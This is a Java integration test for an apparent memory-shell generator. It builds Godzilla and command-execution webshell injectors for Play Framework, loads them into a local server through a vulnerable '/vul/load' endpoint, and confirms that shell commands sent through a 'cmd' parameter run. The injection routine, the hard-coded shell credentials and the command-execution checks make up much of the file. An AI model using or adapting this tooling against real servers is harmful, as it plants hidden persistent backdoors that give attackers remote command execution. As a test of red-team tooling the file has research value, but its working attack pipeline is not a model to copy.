package com.reajason.javaweb.playframework;

import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.PluginBootstrap;
import com.reajason.javaweb.memshell.PluginLoadResult;
import com.reajason.javaweb.memshell.PluginValidationReport;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.stream.Stream;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * End-to-end: the plugin jar is discovered from a plugins directory, the generated injector is
 * delivered into a running Play server, and the Godzilla/Command clients talk to it.
 */
class PlayframeworkShellIntegrationTest {

    private static final String SERVER = "PlayFramework";
    private static final String GODZILLA = "Godzilla";
    private static final String COMMAND = "Command";
    private static final String AKKA_HANDLER = "AkkaHandler";
    private static final String PEKKO_HANDLER = "PekkoHandler";

    private static final String GODZILLA_PASS = "playpass";
    private static final String GODZILLA_KEY = "playkey1";
    private static final String HEADER_NAME = "User-Agent";
    private static final String HEADER_VALUE = "PlayShell/1.0";
    private static final String COMMAND_PARAM = "cmd";

    @BeforeAll
    static void loadPlugin() {
        String directory = System.getProperty("memshell.plugins.dir");
        PluginValidationReport validation = PluginBootstrap.validate(Paths.get(directory));
        assertTrue(validation.isValid(), "plugin validation errors: " + validation.getErrors());
        assertFalse(validation.hasWarnings(), "plugin validation warnings: " + validation.getWarnings());
        assertEquals(1, validation.getPluginJars().size(), "plugin jar not discovered");

        PluginLoadResult result = PluginBootstrap.load();
        assertEquals(1, result.getPluginJars().size(), "plugin jar not discovered: " + result.getWarnings());
        assertFalse(result.hasWarnings(), "plugin load warnings: " + result.getWarnings());
    }

    static Stream<Arguments> ranges() {
        return Stream.of(
                Arguments.of("play2", "playframework.range2.classpath", AKKA_HANDLER),
                Arguments.of("play3", "playframework.range3.classpath", PEKKO_HANDLER));
    }

    @Test
    void pluginRegistersServerAndTools() {
        MemShellGenerator generator = new MemShellGenerator();
        assertTrue(generator.getSupportedServers().contains(SERVER));
        assertTrue(generator.getSupportedTools().contains(GODZILLA));
        assertTrue(generator.getSupportedTools().contains(COMMAND));
        assertEquals(
                Arrays.asList(AKKA_HANDLER, PEKKO_HANDLER),
                generator.getShellTypeCatalog().getShellTypes(SERVER, GODZILLA));
        assertEquals(
                Arrays.asList(AKKA_HANDLER, PEKKO_HANDLER),
                generator.getShellTypeCatalog().getShellTypes(SERVER, COMMAND));
    }

    @Test
    void serverRaisesTargetToJava8AndUsesPlayPackage() {
        MemShellResult result = generator(GODZILLA, AKKA_HANDLER, godzillaParams());

        assertEquals(52, classVersion(result.getInjectorBytes()));
        assertEquals(52, classVersion(result.getShellBytes()));
        assertTrue(result.getShellClassName().startsWith("play.core.server."), result.getShellClassName());
    }

    @ParameterizedTest(name = "{0} godzilla")
    @MethodSource("ranges")
    void godzillaShellStartsAndAnswers(String name, String classpathProperty, String shellType) throws Exception {
        try (PlayRange range = PlayRange.start(System.getProperty(classpathProperty))) {
            MemShellResult result = generator(GODZILLA, shellType, godzillaParams());
            inject(range, result);
            assertEquals("ok", get(range.baseUrl() + "/health").body, range.output());

            try (GodzillaTestClient client = new GodzillaTestClient(
                    range.baseUrl() + "/", GODZILLA_KEY, GODZILLA_PASS, HEADER_NAME, HEADER_VALUE)) {
                assertTrue(client.start(), range.output());
                assertTrue(client.test(), "godzilla payload did not answer\n" + range.output());
            }
        }
    }

    @ParameterizedTest(name = "{0} command")
    @MethodSource("ranges")
    void commandShellExecutes(String name, String classpathProperty, String shellType) throws Exception {
        try (PlayRange range = PlayRange.start(System.getProperty(classpathProperty))) {
            Map<String, Object> params = new LinkedHashMap<String, Object>();
            params.put("paramName", COMMAND_PARAM);
            MemShellResult result = generator(COMMAND, shellType, params);
            inject(range, result);
            assertEquals("ok", get(range.baseUrl() + "/health").body, range.output());

            Response form = post(range.baseUrl() + "/any",
                    COMMAND_PARAM + "=" + urlEncode("echo form-$(( 40 + 2 ))"),
                    "application/x-www-form-urlencoded");
            assertEquals(200, form.status, range.output());
            assertTrue(form.body.contains("form-42"), "form body response: " + form.body + "\n" + range.output());

            Response query = get(range.baseUrl() + "/any?" + COMMAND_PARAM + "=" + urlEncode("echo query-ok"));
            assertEquals(200, query.status, range.output());
            assertTrue(query.body.contains("query-ok"), "query response: " + query.body + "\n" + range.output());
        }
    }

    private static Map<String, Object> godzillaParams() {
        Map<String, Object> params = new LinkedHashMap<String, Object>();
        params.put("pass", GODZILLA_PASS);
        params.put("key", GODZILLA_KEY);
        params.put("headerName", HEADER_NAME);
        params.put("headerValue", HEADER_VALUE);
        return params;
    }

    private static MemShellResult generator(String tool, String shellType, Map<String, Object> params) {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(SERVER)
                .shellTool(tool)
                .shellType(shellType)
                // Left at the default so the server's Java 8 floor is what raises it.
                // debug keeps the injector's injection log; the default strips it from generated bytecode.
                .debug(true)
                .build();
        return new MemShellGenerator().generate(shellConfig, InjectorConfig.builder()
                .urlPattern("/*")
                // The desktop form enables this by default; the generated <clinit> instantiates the
                // template, so generation must accept the injector's no-arg constructor.
                .staticInitialize(true)
                .build(), params);
    }

    private static int classVersion(byte[] bytes) {
        return ((bytes[6] & 0xFF) << 8) | (bytes[7] & 0xFF);
    }

    private static void inject(PlayRange range, MemShellResult result) throws IOException {
        assertTrue(result.getInjectorInnerClassBytes() == null || result.getInjectorInnerClassBytes().isEmpty(),
                "the injector must ship as one class for single-request delivery");
        String payload = Base64.getEncoder().encodeToString(result.getInjectorBytes());
        Response response = post(range.baseUrl() + "/vul/load", payload, "text/plain");
        assertEquals(200, response.status, "injector delivery failed: " + response.body + "\n" + range.output());
        assertTrue(response.body.startsWith("loaded "), response.body);
    }

    private static String urlEncode(String value) {
        try {
            return java.net.URLEncoder.encode(value, "UTF-8");
        } catch (IOException e) {
            throw new IllegalStateException(e);
        }
    }

    private static Response get(String url) throws IOException {
        HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
        connection.setRequestMethod("GET");
        return read(connection);
    }

    private static Response post(String url, String body, String contentType) throws IOException {
        HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
        connection.setRequestMethod("POST");
        connection.setDoOutput(true);
        connection.setRequestProperty("Content-Type", contentType);
        byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
        connection.setFixedLengthStreamingMode(bytes.length);
        try (OutputStream output = connection.getOutputStream()) {
            output.write(bytes);
        }
        return read(connection);
    }

    private static Response read(HttpURLConnection connection) throws IOException {
        int status = connection.getResponseCode();
        InputStream stream = status >= 400 ? connection.getErrorStream() : connection.getInputStream();
        String body = stream == null ? "" : new String(readFully(stream), StandardCharsets.UTF_8);
        connection.disconnect();
        return new Response(status, body);
    }

    private static byte[] readFully(InputStream stream) throws IOException {
        try (InputStream input = stream; ByteArrayOutputStream output = new ByteArrayOutputStream()) {
            byte[] buffer = new byte[4096];
            int read;
            while ((read = input.read(buffer)) > 0) {
                output.write(buffer, 0, read);
            }
            return output.toByteArray();
        }
    }

    private static final class Response {
        private final int status;
        private final String body;

        private Response(int status, String body) {
            this.status = status;
            this.body = body;
        }
    }
}
